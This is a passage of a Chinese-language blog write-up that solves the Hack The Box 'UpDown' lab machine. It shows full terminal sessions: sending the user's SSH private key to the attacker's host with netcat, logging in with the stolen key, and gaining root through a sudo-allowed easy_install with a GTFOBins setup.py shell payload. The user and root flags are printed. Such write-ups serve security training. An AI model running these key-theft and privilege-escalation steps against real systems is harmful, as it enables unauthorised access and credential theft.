class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c">developer@updown:/home/developer/dev$ cd ../<br>cd ../<br>developer@updown:/home/developer$ ls -la<br>ls -la<br>total <span class="hljs-number">40</span><br>drwxr-xr-x <span class="hljs-number">6</span> developer developer <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root      root      <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root      root         <span class="hljs-number">9</span> Jul <span class="hljs-number">27</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer  <span class="hljs-number">231</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer <span class="hljs-number">3771</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> developer developer <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> .cache<br>drwxrwxr-x <span class="hljs-number">3</span> developer developer <span class="hljs-number">4096</span> Aug  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> .local<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer  <span class="hljs-number">807</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .profile<br>drwx------ <span class="hljs-number">2</span> developer developer <span class="hljs-number">4096</span> Aug  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .ssh<br>drwxr-x--- <span class="hljs-number">2</span> developer www-data  <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> dev<br>-rw-r----- <span class="hljs-number">1</span> root      developer   <span class="hljs-number">33</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span> user.txt<br>developer@updown:/home/developer$ cat user.txt<br>cat user.txt<br>cat: user.txt: Permission denied<br>developer@updown:/home/developer$ cd .ssh<br>cd .ssh<br>developer@updown:/home/developer/.ssh$ ls -la<br>ls -la<br>total <span class="hljs-number">20</span><br>drwx------ <span class="hljs-number">2</span> developer developer <span class="hljs-number">4096</span> Aug  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">6</span> developer developer <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> ..<br>-rw-rw-r-- <span class="hljs-number">1</span> developer developer  <span class="hljs-number">572</span> Aug  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> authorized_keys<br>-rw------- <span class="hljs-number">1</span> developer developer <span class="hljs-number">2602</span> Aug  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> id_rsa<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer  <span class="hljs-number">572</span> Aug  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> id_rsa.pub<br>developer@updown:/home/developer/.ssh$ <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">80</span> &gt; id_rsa          <br>listening on [any] <span class="hljs-number">80</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span>] <span class="hljs-number">36702</span><br>^C<br><br>developer@updown:/home/developer/.ssh$ nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> &lt; ./id_rsa<br>nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> &lt; ./id_rsa<br>Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> port [tcp/http] succeeded!<br>developer@updown:/home/developer/.ssh$ <br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ chmod <span class="hljs-number">600</span> id_rsa           <br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh developer@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span> -i id_rsa <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.177 (10.10.11.177)&#x27;</span> can<span class="hljs-number">&#x27;</span>t be established.<br>ED25519 key fingerprint is SHA256:c0DzrPfIOA6IA7zGJh7Ee/FJ3B2g7R2KnzeUif9zCWQ.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-keyword">continue</span> <span class="hljs-title function_">connecting</span> <span class="hljs-params">(yes/no/[fingerprint])</span>? yes<br>Warning: Permanently added &#x27;10.10.11.177&#x27; <span class="hljs-params">(ED25519)</span> to the <span class="hljs-built_in">list</span> of known hosts.<br>Welcome to Ubuntu 20.04.5 <span class="hljs-title function_">LTS</span> <span class="hljs-params">(GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-122</span>-generic x86_64)</span><br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br>  System information as of Sun Apr 28 07:16:45 UTC 2024<br><br>  System load:           0.0<br>  Usage of /:            49.9% of 2.84GB<br>  Memory usage:          16%<br>  Swap usage:            0%<br>  Processes:             230<br>  Users logged in:       0<br>  IPv4 address <span class="hljs-keyword">for</span> eth0: 10.10.11.177<br>  IPv6 address <span class="hljs-keyword">for</span> eth0: dead:beef::250:56ff:feb9:5e17<br><br><br>8 updates can be applied immediately.<br>8 of these updates are standard security updates.<br>To see these additional updates run: apt <span class="hljs-built_in">list</span> --upgradable<br><br><br>The <span class="hljs-built_in">list</span> of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36<br>developer@updown:~$ id<br>uid=<span class="hljs-number">1002</span>(developer) gid=<span class="hljs-number">1002</span>(developer) groups=<span class="hljs-number">1002</span>(developer)<br>developer@updown:~$<br></code></pre></td></tr></table></figure>
+
+<p>21、获取下第一个flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">developer@updown:~$ hostname<br>updown<br>developer@updown:~$ cat user.txt<br>fb982b76b8259718822b80af37be9ad7<br>developer@updown:~$ ifconfig<br>eth0: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span>  netmask <span class="hljs-number">255.255</span><span class="hljs-number">.254</span><span class="hljs-number">.0</span>  broadcast <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.255</span><br>        inet6 dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56f</span>f:feb9:<span class="hljs-number">5e17</span>  prefixlen <span class="hljs-number">64</span>  scopeid <span class="hljs-number">0x0</span>&lt;global&gt;<br>        inet6 fe80::<span class="hljs-number">250</span>:<span class="hljs-number">56f</span>f:feb9:<span class="hljs-number">5e17</span>  prefixlen <span class="hljs-number">64</span>  scopeid <span class="hljs-number">0x20</span>&lt;link&gt;<br>        ether <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:<span class="hljs-number">5</span>e:<span class="hljs-number">17</span>  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)<br>        RX packets <span class="hljs-number">4074</span>  bytes <span class="hljs-number">385354</span> (<span class="hljs-number">385.3</span> KB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">667</span>  bytes <span class="hljs-number">206816</span> (<span class="hljs-number">206.8</span> KB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>lo: flags=<span class="hljs-number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="hljs-number">65536</span><br>        inet <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>  netmask <span class="hljs-number">255.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>        inet6 ::<span class="hljs-number">1</span>  prefixlen <span class="hljs-number">128</span>  scopeid <span class="hljs-number">0x10</span>&lt;host&gt;<br>        loop  txqueuelen <span class="hljs-number">1000</span>  (Local Loopback)<br>        RX packets <span class="hljs-number">40</span>  bytes <span class="hljs-number">3608</span> (<span class="hljs-number">3.6</span> KB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">40</span>  bytes <span class="hljs-number">3608</span> (<span class="hljs-number">3.6</span> KB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>developer@updown:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>22、开始继续枚举</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">developer@updown:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> developer on localhost:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User developer may run the following commands on localhost:<br>    (ALL) NOPASSWD: /usr/local/bin/easy_install<br>developer@updown:~$ ls -la /usr/local/bin/easy_install<br>-rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">229</span> Aug  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> /usr/local/bin/easy_install<br>developer@updown:~$ cat /usr/local/bin/easy_install<br>#!/usr/bin/python<br># -*- coding: utf<span class="hljs-number">-8</span> -*-<br>import re<br>import sys<br>from setuptools.command.easy_install import main<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.argv[<span class="hljs-number">0</span>] = re.sub(r<span class="hljs-number">&#x27;</span>(-script\.pyw|\.exe)?$<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&#x27;, sys.argv[0])</span><br><span class="hljs-string">    sys.exit(main())</span><br><span class="hljs-string">developer@updown:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>23、easy_install 是一种在Python中安装软件包的方法，现在已被弃用。它的核心是运行一个 setup.py 脚本，该脚本承诺采取某些操作来安装软件包。由于 easy_install 有效地运行了一个Python脚本，因此从它获得执行是微不足道的。有一个GTFObins页面，其中包含一些复制粘贴以获取shell，但我将自己完成它以更好地理解它。</p>
+<p><code>https://gtfobins.github.io/gtfobins/easy_install/</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">TF=$(mktemp -d)<br>echo <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot;</span> &gt; $TF/setup.py<br>sudo easy_install $TF<br></code></pre></td></tr></table></figure>
+
+<p>24、那就直接利用提权吧，并读取下flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">developer@updown:~$ TF=$(mktemp -d)<br>developer@updown:~$ echo <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot;</span> &gt; $TF/setup.py<br>developer@updown:~$ <br>developer@updown:~$ sudo easy_install $TF<br>WARNING: The easy_install command is deprecated and will be removed in a <span class="hljs-built_in">future</span> version.<br>Processing tmp<span class="hljs-number">.2</span>Twcv6BdHr<br>Writing /tmp/tmp<span class="hljs-number">.2</span>Twcv6BdHr/setup.cfg<br>Running setup.py -q bdist_egg --dist-dir /tmp/tmp<span class="hljs-number">.2</span>Twcv6BdHr/egg-dist-tmp-py4Npp<br><span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br><span class="hljs-meta"># python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br>root@updown:/tmp/tmp<span class="hljs-number">.2</span>Twcv6BdHr<span class="hljs-meta"># </span><br><span class="hljs-meta">root@updown:/tmp/tmp.2Twcv6BdHr# cd ~</span><br>root@updown:~<span class="hljs-meta"># ls -la</span><br>total <span class="hljs-number">44</span><br>drwx------  <span class="hljs-number">6</span> root root <span class="hljs-number">4096</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root root <span class="hljs-number">4096</span> Aug  <span class="hljs-number">3</span>  <span class="hljs-number">2022</span> ..<br>lrwxrwxrwx  <span class="hljs-number">1</span> root root    <span class="hljs-number">9</span> Jul <span class="hljs-number">27</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r--  <span class="hljs-number">1</span> root root   <span class="hljs-number">11</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .bash_logout<br>-rw-r--r--  <span class="hljs-number">1</span> root root <span class="hljs-number">3106</span> Dec  <span class="hljs-number">5</span>  <span class="hljs-number">2019</span> .bashrc<br>drwxr-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .cache<br>drwxr-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">27</span>  <span class="hljs-number">2022</span> .local<br>-rw-r--r--  <span class="hljs-number">1</span> root root  <span class="hljs-number">161</span> Dec  <span class="hljs-number">5</span>  <span class="hljs-number">2019</span> .profile<br>-rw-r--r--  <span class="hljs-number">1</span> root root   <span class="hljs-number">66</span> Aug  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> .selected_editor<br>drwx------  <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .ssh<br>-rw-r-----  <span class="hljs-number">1</span> root root   <span class="hljs-number">33</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span> root.txt<br>drwx------  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> snap<br>root@updown:~<span class="hljs-meta"># cat root.txt</span><br><span class="hljs-number">7</span>aed504e303e2a960abdcbae6426559d<br>root@updown:~# <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/493</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>UpDown-htb-writeup</div>
+      <div>https://sh1yan.top/2024/04/28/UpDown-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/26/Jeeves-htb-writeup/" title="Jeeves-htb-writeup">
+                        <span class="hidden-mobile">Jeeves-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
